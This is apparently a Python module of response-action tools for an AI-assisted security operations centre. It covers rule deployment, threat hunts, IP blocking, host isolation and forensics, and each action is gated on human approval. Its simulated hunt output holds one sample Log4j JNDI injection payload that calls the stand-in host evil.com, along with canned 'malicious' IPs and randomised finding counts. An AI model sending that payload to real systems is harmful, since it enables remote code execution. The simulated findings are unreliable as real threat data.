"""
Tools for the Action Agent.
Handles executing response actions and generating action recommendations.

UPDATED VERSION - Added hunt response action capabilities (block IPs, isolate hosts, etc.)
"""
import json
from datetime import datetime
from typing import Dict, Any, List

# Use the correct imports based on your project structure
from database import SessionLocal, Incident, Action, PendingAction, DetectionRule, Hunt, HuntResult


def execute_action(action_id: int, executed_by: str = "analyst") -> Dict[str, Any]:
    """
    Execute a recommended action and mark it as completed.
    
    Args:
        action_id: The ID of the action to execute
        executed_by: Who is executing the action (default: analyst)
    
    Returns:
        Dictionary with execution result
    """
    db = SessionLocal()
    try:
        action = db.query(Action).filter(Action.id == action_id).first()
        
        if not action:
            return {"success": False, "error": f"Action {action_id} not found"}
        
        if action.executed:
            return {"success": False, "error": f"Action {action_id} already executed"}
        
        action.executed = True
        action.executed_at = datetime.utcnow()
        action.executed_by = executed_by
        action.result = json.dumps({
            "status": "executed",
            "message": f"Action '{action.title}' executed successfully",
            "timestamp": str(datetime.utcnow())
        })
        
        db.commit()
        
        return {
            "success": True,
            "action": {
                "id": action.id,
                "title": action.title,
                "executed": True,
                "executed_at": str(action.executed_at),
                "executed_by": action.executed_by
            }
        }
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def get_incident_actions(incident_id: int) -> Dict[str, Any]:
    """
    Get all actions associated with a specific incident.
    
    Args:
        incident_id: The ID of the incident
    
    Returns:
        Dictionary with list of actions
    """
    db = SessionLocal()
    try:
        incident = db.query(Incident).filter(Incident.id == incident_id).first()
        
        if not incident:
            return {"success": False, "error": f"Incident {incident_id} not found"}
        
        actions = db.query(Action).filter(Action.incident_id == incident_id).all()
        
        return {
            "success": True,
            "incident_id": incident_id,
            "incident_title": incident.title,
            "actions": [
                {
                    "id": a.id,
                    "title": a.title,
                    "description": a.description,
                    "action_type": a.action_type,
                    "urgency": a.urgency,
                    "executed": a.executed,
                    "executed_at": str(a.executed_at) if a.executed_at else None,
                    "executed_by": a.executed_by
                }
                for a in actions
            ]
        }
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def get_all_pending_actions() -> Dict[str, Any]:
    """
    Get all actions that haven't been executed yet.
    
    Returns:
        Dictionary with list of pending actions
    """
    db = SessionLocal()
    try:
        actions = db.query(Action).filter(Action.executed == False).all()
        
        return {
            "success": True,
            "pending_count": len(actions),
            "actions": [
                {
                    "id": a.id,
                    "incident_id": a.incident_id,
                    "title": a.title,
                    "urgency": a.urgency,
                    "action_type": a.action_type
                }
                for a in actions
            ]
        }
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def create_action(
    incident_id: int,
    title: str,
    description: str,
    urgency: str = "Soon",
    action_type: str = "AI Recommended"
) -> Dict[str, Any]:
    """
    Create a new action for an incident.
    
    Args:
        incident_id: The ID of the incident this action belongs to
        title: Brief action title
        description: Detailed description of what to do
        urgency: Priority level (Immediate, Soon, Monitor)
        action_type: Type of action (AI Recommended, Manual, Automated)
    
    Returns:
        Dictionary with created action details
    """
    db = SessionLocal()
    try:
        incident = db.query(Incident).filter(Incident.id == incident_id).first()
        
        if not incident:
            return {"success": False, "error": f"Incident {incident_id} not found"}
        
        action = Action(
            incident_id=incident_id,
            title=title,
            description=description,
            urgency=urgency,
            action_type=action_type
        )
        db.add(action)
        db.commit()
        
        return {
            "success": True,
            "action": {
                "id": action.id,
                "incident_id": incident_id,
                "title": title,
                "description": description,
                "urgency": urgency,
                "action_type": action_type,
                "executed": False
            }
        }
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e)}
    finally:
        db.close()


# ========================= THREAT CENTER ACTIONS =========================

def deploy_detection_rule(rule_id: int) -> Dict[str, Any]:
    """
    Deploy an approved detection rule to SIEM.
    
    SAFEGUARD: Only deploys if rule.status == 'approved' AND approved_by is set.
    
    Args:
        rule_id: The ID of the detection rule to deploy
    
    Returns:
        Dictionary with deployment result
    """
    db = SessionLocal()
    try:
        rule = db.query(DetectionRule).filter(DetectionRule.id == rule_id).first()
        
        if not rule:
            return {"success": False, "error": f"Rule {rule_id} not found"}
        
        # ========== SAFEGUARD CHECKS ==========
        if rule.status != 'approved':
            return {
                "success": False,
                "error": f"Rule not approved. Current status: {rule.status}",
                "hint": "Rule must be approved via UI before deployment"
            }
        
        if not rule.approved_by:
            return {"success": False, "error": "No approver recorded - cannot deploy"}
        
        if not rule.approved_at:
            return {"success": False, "error": "No approval timestamp - cannot deploy"}
        # ========== END SAFEGUARDS ==========
        
        # Update status to deploying
        rule.status = 'deploying'
        db.commit()
        
        # In production, call Sentinel API here
        # For now, simulate successful deployment
        deployment_result = {
            "success": True,
            "message": f"Rule '{rule.title}' deployed to {rule.siem_platform}",
            "sentinel_rule_id": f"soc-ai-{rule.id}-{int(datetime.now().timestamp())}"
        }
        
        if deployment_result["success"]:
            rule.status = 'deployed'
            rule.deployed_at = datetime.utcnow()
            rule.sentinel_rule_id = deployment_result.get("sentinel_rule_id")
        else:
            rule.status = 'failed'
            rule.deployment_error = deployment_result.get("error", "Unknown error")
        
        db.commit()
        
        return {
            "success": True,
            "rule_id": rule_id,
            "status": rule.status,
            "sentinel_rule_id": rule.sentinel_rule_id,
            "message": deployment_result.get("message")
        }
        
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def execute_hunt(hunt_id: int) -> Dict[str, Any]:
    """
    Execute an approved threat hunt.
    
    SAFEGUARD: Only executes if hunt.status == 'approved' AND approved_by is set.
    
    Args:
        hunt_id: The ID of the hunt to execute
    
    Returns:
        Dictionary with execution result
    """
    db = SessionLocal()
    try:
        hunt = db.query(Hunt).filter(Hunt.id == hunt_id).first()
        
        if not hunt:
            return {"success": False, "error": f"Hunt {hunt_id} not found"}
        
        # ========== SAFEGUARD CHECKS ==========
        if hunt.status != 'approved':
            return {
                "success": False,
                "error": f"Hunt not approved. Current status: {hunt.status}",
                "hint": "Hunt must be approved via UI before execution"
            }
        
        if not hunt.approved_by:
            return {"success": False, "error": "No approver recorded - cannot execute"}
        
        if not hunt.approved_at:
            return {"success": False, "error": "No approval timestamp - cannot execute"}
        # ========== END SAFEGUARDS ==========
        
        # Update status
        hunt.status = 'executing'
        hunt.executed_at = datetime.utcnow()
        db.commit()
        
        # Simulate hunt execution (in production, run actual SIEM query)
        simulated_results = simulate_hunt_execution(hunt.hunt_query)
        
        # Save results
        hunt_result = HuntResult(
            hunt_id=hunt.id,
            findings_count=simulated_results['total_events'],
            findings_summary=simulated_results['summary'],
            malicious_ips=json.dumps(simulated_results.get('malicious_ips', [])),
            suspicious_domains=json.dumps(simulated_results.get('suspicious_domains', [])),
            affected_hosts=json.dumps(simulated_results.get('affected_hosts', [])),
            raw_results=json.dumps(simulated_results.get('raw', []))
        )
        db.add(hunt_result)
        
        hunt.status = 'completed'
        hunt.completed_at = datetime.utcnow()
        db.commit()
        
        return {
            "success": True,
            "hunt_id": hunt_id,
            "status": "completed",
            "findings_count": hunt_result.findings_count,
            "malicious_ips": simulated_results.get('malicious_ips', []),
            "affected_hosts": simulated_results.get('affected_hosts', [])
        }
        
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def simulate_hunt_execution(query: str) -> Dict[str, Any]:
    """
    Simulate hunt query execution.
    In production, replace with actual SIEM API call (Sentinel, Splunk, Elastic).
    
    Args:
        query: The hunt query to execute
    
    Returns:
        Simulated results
    """
    import random
    
    query_lower = (query or '').lower()
    
    # Pattern-based simulation
    if 'jndi' in query_lower or 'log4j' in query_lower:
        return {
            'total_events': random.randint(10, 50),
            'summary': 'Found JNDI injection attempts targeting web servers',
            'malicious_ips': ['185.220.101.34', '45.155.205.233', '194.26.29.102'],
            'affected_hosts': ['web-server-01', 'app-server-02'],
            'raw': [
                {'time': '2024-01-15T08:23:00', 'src': '185.220.101.34', 'payload': '${jndi:ldap://evil.com/a}'}
            ]
        }
    elif 'powershell' in query_lower or 'encoded' in query_lower:
        return {
            'total_events': random.randint(5, 20),
            'summary': 'Detected encoded PowerShell commands',
            'malicious_ips': ['10.0.5.100'],
            'affected_hosts': ['ws-042', 'srv-app-03'],
            'raw': []
        }
    elif 'fortinet' in query_lower or 'auth' in query_lower or 'signinlogs' in query_lower:
        return {
            'total_events': random.randint(10, 40),
            'summary': 'Multiple failed authentication attempts from suspicious IPs',
            'malicious_ips': ['203.0.113.50', '198.51.100.25'],
            'affected_hosts': ['FORTINET-FW-01'],
            'raw': []
        }
    elif 'admin' in query_lower or 'privilege' in query_lower:
        return {
            'total_events': random.randint(8, 30),
            'summary': 'Suspicious admin account activity detected',
            'malicious_ips': ['198.51.100.77'],
            'affected_hosts': ['DC-PRIMARY-01', 'srv-admin-01'],
            'raw': []
        }
    else:
        return {
            'total_events': random.randint(0, 10),
            'summary': 'Hunt completed with minimal findings',
            'malicious_ips': [],
            'affected_hosts': [],
            'raw': []
        }


def block_ip_list(ips: List[str]) -> Dict[str, Any]:
    """
    Block a list of IPs at the firewall.
    In production, integrate with your firewall API.
    
    Args:
        ips: List of IP addresses to block
    
    Returns:
        Result of the blocking operation
    """
    # Simulate firewall API call
    # In production, call:
    # - Fortinet: fortigate-api
    # - Palo Alto: pan-python
    # - Cisco: Firepower API
    # - Azure: Network Security Group rules
    
    return {
        "success": True,
        "message": f"Blocked {len(ips)} IPs at firewall",
        "blocked": ips,
        "firewall": "FORTINET-FW-01",
        "rule_name": f"BLOCK-HUNT-{datetime.now().strftime('%Y%m%d%H%M')}"
    }


def execute_approved_action(action_id: int) -> Dict[str, Any]:
    """
    Execute a pending action ONLY if it has been approved.
    
    SAFEGUARD: Checks status == 'approved' AND approved_by is set.
    
    Args:
        action_id: The ID of the pending action to execute
    
    Returns:
        Dictionary with execution result
    """
    db = SessionLocal()
    try:
        action = db.query(PendingAction).filter(PendingAction.id == action_id).first()
        
        if not action:
            return {"success": False, "error": f"Action {action_id} not found", "executed": False}
        
        # ========== SAFEGUARD CHECKS ==========
        if action.status != 'approved':
            return {
                "success": False,
                "error": f"Action not approved. Current status: {action.status}",
                "executed": False
            }
        
        if not action.approved_by:
            return {"success": False, "error": "No approver recorded", "executed": False}
        # ========== END SAFEGUARDS ==========
        
        # Update status
        action.status = 'executing'
        db.commit()
        
        # Execute based on action type
        payload = json.loads(action.payload) if action.payload else {}
        
        if action.action_type == 'deploy_rule':
            result = deploy_detection_rule(payload.get('rule_id'))
        elif action.action_type == 'block_ips':
            result = block_ip_list(payload.get('ips', []))
        elif action.action_type == 'execute_hunt':
            result = execute_hunt(payload.get('hunt_id'))
        elif action.action_type == 'investigate_hosts':
            result = investigate_hosts(payload.get('hosts', []))
        elif action.action_type == 'isolate_host':
            result = isolate_host(payload.get('hosts', []))
        elif action.action_type == 'escalate_incident':
            result = escalate_hunt_to_incident(payload.get('hunt_id'), payload.get('result_id'))
        elif action.action_type == 'collect_forensics':
            result = collect_forensics(payload.get('hosts', []))
        else:
            result = {"success": True, "message": f"Action type '{action.action_type}' executed"}
        
        # Update action status
        action.status = 'completed' if result.get('success') else 'failed'
        action.executed_at = datetime.utcnow()
        action.execution_result = json.dumps(result)
        db.commit()
        
        return {
            "success": result.get('success', False),
            "executed": True,
            "action_id": action.id,
            "action_type": action.action_type,
            "result": result
        }
        
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e), "executed": False}
    finally:
        db.close()


# ========================= HUNT RESPONSE ACTIONS (NEW) =========================

def investigate_hosts(hostnames: List[str]) -> Dict[str, Any]:
    """
    Initiate investigation on affected hosts.
    In production, this would trigger EDR investigation or create tickets.
    
    Args:
        hostnames: List of hostnames to investigate
    
    Returns:
        Dictionary with investigation result
    """
    # In production, integrate with:
    # - CrowdStrike: Start RTR session
    # - Microsoft Defender: Start investigation
    # - ServiceNow: Create investigation ticket
    
    investigation_id = f"INV-{datetime.now().strftime('%Y%m%d%H%M%S')}"
    
    return {
        "success": True,
        "message": f"Investigation initiated for {len(hostnames)} hosts",
        "investigation_id": investigation_id,
        "hosts": hostnames,
        "status": "in_progress",
        "actions_taken": [
            "Created investigation ticket",
            "Queued hosts for EDR deep scan",
            "Notified SOC team"
        ]
    }


def isolate_host(hostnames: List[str]) -> Dict[str, Any]:
    """
    Isolate compromised hosts from the network via EDR.
    
    Args:
        hostnames: List of hostnames to isolate
    
    Returns:
        Dictionary with isolation result
    """
    # In production, integrate with:
    # - CrowdStrike: contain_host API
    # - Microsoft Defender: isolate machine API
    # - SentinelOne: disconnect from network API
    # - Carbon Black: quarantine device API
    
    isolation_results = []
    for host in hostnames:
        isolation_results.append({
            "hostname": host,
            "status": "isolated",
            "isolation_type": "full",
            "network_access": "blocked",
            "can_communicate_with": ["security_tools", "dns"]
        })
    
    return {
        "success": True,
        "message": f"Successfully isolated {len(hostnames)} hosts from network",
        "isolated_count": len(hostnames),
        "hosts": hostnames,
        "isolation_results": isolation_results
    }


def collect_forensics(hostnames: List[str]) -> Dict[str, Any]:
    """
    Collect forensic evidence from affected hosts.
    
    Args:
        hostnames: List of hostnames to collect forensics from
    
    Returns:
        Dictionary with forensics collection result
    """
    # In production, trigger forensic collection via EDR:
    # - Memory dump
    # - Event logs
    # - Process list
    # - Network connections
    # - Registry hives
    
    collection_id = f"FORENSIC-{datetime.now().strftime('%Y%m%d%H%M%S')}"
    
    return {
        "success": True,
        "message": f"Forensic collection initiated for {len(hostnames)} hosts",
        "collection_id": collection_id,
        "hosts": hostnames,
        "artifacts_queued": [
            "memory_dump.raw",
            "security_events.evtx",
            "system_events.evtx",
            "running_processes.json",
            "network_connections.json",
            "scheduled_tasks.json",
            "registry_hives.zip"
        ],
        "storage_location": f"/forensics/{collection_id}/"
    }


def escalate_hunt_to_incident(hunt_id: int, result_id: int = None) -> Dict[str, Any]:
    """
    Escalate hunt findings to a formal security incident.
    
    Args:
        hunt_id: ID of the hunt to escalate
        result_id: Optional specific result ID
    
    Returns:
        Dictionary with created incident details
    """
    db = SessionLocal()
    try:
        hunt = db.query(Hunt).filter(Hunt.id == hunt_id).first()
        if not hunt:
            return {"success": False, "error": f"Hunt {hunt_id} not found"}
        
        # Get hunt results
        if result_id:
            result = db.query(HuntResult).filter(HuntResult.id == result_id).first()
        else:
            result = db.query(HuntResult).filter(
                HuntResult.hunt_id == hunt_id
            ).order_by(HuntResult.executed_at.desc()).first()
        
        if not result:
            return {"success": False, "error": "No hunt results found"}
        
        if result.escalated:
            return {
                "success": False,
                "error": f"Hunt already escalated to Incident #{result.incident_id}"
            }
        
        # Parse findings
        malicious_ips = json.loads(result.malicious_ips) if result.malicious_ips else []
        affected_hosts = json.loads(result.affected_hosts) if result.affected_hosts else []
        
        # Build incident summary
        summary = f"""INCIDENT CREATED FROM THREAT HUNT

Hunt: {hunt.title}
CVE: {hunt.related_cve or 'N/A'}
MITRE Technique: {hunt.mitre_technique or 'N/A'}

FINDINGS:
- Total Indicators: {result.findings_count or 0}
- Malicious IPs: {', '.join(malicious_ips) if malicious_ips else 'None'}
- Affected Hosts: {', '.join(affected_hosts) if affected_hosts else 'None'}

HUNT SUMMARY:
{result.findings_summary or 'No summary available'}

RECOMMENDED ACTIONS:
1. Block identified malicious IPs at firewall
2. Isolate affected hosts for investigation
3. Collect forensic evidence
4. Review logs for lateral movement
5. Reset credentials for affected accounts
"""
        
        # Determine severity
        findings_count = result.findings_count or 0
        if findings_count > 30 or len(malicious_ips) > 3:
            severity = 'critical'
        elif findings_count > 15 or len(malicious_ips) > 0:
            severity = 'high'
        elif findings_count > 5:
            severity = 'medium'
        else:
            severity = 'low'
        
        # Create incident
        incident = Incident(
            title=f"[Hunt Escalation] {hunt.title}",
            summary=summary,
            severity=severity,
            status='active',
            attack_stage='detected',
            alert_count=findings_count
        )
        
        db.add(incident)
        db.commit()
        db.refresh(incident)
        
        # Mark hunt result as escalated
        result.escalated = True
        result.incident_id = incident.id
        db.commit()
        
        return {
            "success": True,
            "message": f"Hunt escalated to Incident #{incident.id}",
            "incident_id": incident.id,
            "incident_title": incident.title,
            "severity": severity,
            "hunt_id": hunt_id
        }
        
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e)}
    finally:
        db.close()


def analyze_hunt_and_create_actions(hunt_id: int, result_id: int) -> Dict[str, Any]:
    """
    Analyze hunt results and automatically create recommended response actions.
    Called after hunt execution to generate pending actions for human approval.
    
    Args:
        hunt_id: ID of the hunt
        result_id: ID of the hunt result
    
    Returns:
        Dictionary with created actions
    """
    db = SessionLocal()
    try:
        hunt = db.query(Hunt).filter(Hunt.id == hunt_id).first()
        result = db.query(HuntResult).filter(HuntResult.id == result_id).first()
        
        if not hunt or not result:
            return {"success": False, "error": "Hunt or result not found"}
        
        malicious_ips = json.loads(result.malicious_ips) if result.malicious_ips else []
        affected_hosts = json.loads(result.affected_hosts) if result.affected_hosts else []
        findings_count = result.findings_count or 0
        
        actions_created = []
        
        # Only create actions if there are significant findings
        if findings_count > 5 or malicious_ips:
            
            # Create action to block IPs if found
            if malicious_ips:
                ip_action = PendingAction(
                    action_type='block_ips',
                    title=f'Block {len(malicious_ips)} malicious IPs from hunt',
                    description=f'Hunt "{hunt.title}" detected malicious IPs: {", ".join(malicious_ips)}. Recommend blocking at firewall.',
                    payload=json.dumps({'ips': malicious_ips, 'hunt_id': hunt_id}),
                    source_type='hunt',
                    source_id=hunt_id,
                    priority='CRITICAL' if findings_count > 20 else 'HIGH',
                    status='pending'
                )
                db.add(ip_action)
                actions_created.append({
                    'type': 'block_ips',
                    'title': ip_action.title,
                    'urgency': ip_action.priority
                })
            
            # Create action to investigate hosts if found
            if affected_hosts:
                host_action = PendingAction(
                    action_type='investigate_hosts',
                    title=f'Investigate {len(affected_hosts)} affected hosts',
                    description=f'Hunt "{hunt.title}" found suspicious activity on: {", ".join(affected_hosts)}. Recommend forensic investigation.',
                    payload=json.dumps({'hosts': affected_hosts, 'hunt_id': hunt_id}),
                    source_type='hunt',
                    source_id=hunt_id,
                    priority='HIGH',
                    status='pending'
                )
                db.add(host_action)
                actions_created.append({
                    'type': 'investigate_hosts',
                    'title': host_action.title,
                    'urgency': host_action.priority
                })
            
            # Recommend escalation if high findings
            if findings_count > 15:
                escalate_action = PendingAction(
                    action_type='escalate_incident',
                    title=f'Escalate hunt findings to incident',
                    description=f'Hunt "{hunt.title}" found {findings_count} indicators. High risk of active compromise. Recommend immediate escalation.',
                    payload=json.dumps({'hunt_id': hunt_id, 'result_id': result_id}),
                    source_type='hunt',
                    source_id=hunt_id,
                    priority='CRITICAL',
                    status='pending'
                )
                db.add(escalate_action)
                actions_created.append({
                    'type': 'escalate_incident',
                    'title': escalate_action.title,
                    'urgency': escalate_action.priority
                })
        
        db.commit()
        
        return {
            "success": True,
            "hunt_id": hunt_id,
            "actions_created": len(actions_created),
            "recommended_actions": actions_created,
            "message": f"Created {len(actions_created)} response actions for approval"
        }
        
    except Exception as e:
        db.rollback()
        return {"success": False, "error": str(e)}
    finally:
        db.close()


# Export all functions
__all__ = [
    # Original incident action tools
    'execute_action',
    'get_incident_actions',
    'get_all_pending_actions',
    'create_action',
    # Threat center tools
    'deploy_detection_rule',
    'execute_hunt',
    'block_ip_list',
    'execute_approved_action',
    # NEW: Hunt response tools
    'investigate_hosts',
    'isolate_host',
    'collect_forensics',
    'escalate_hunt_to_incident',
    'analyze_hunt_and_create_actions'
]
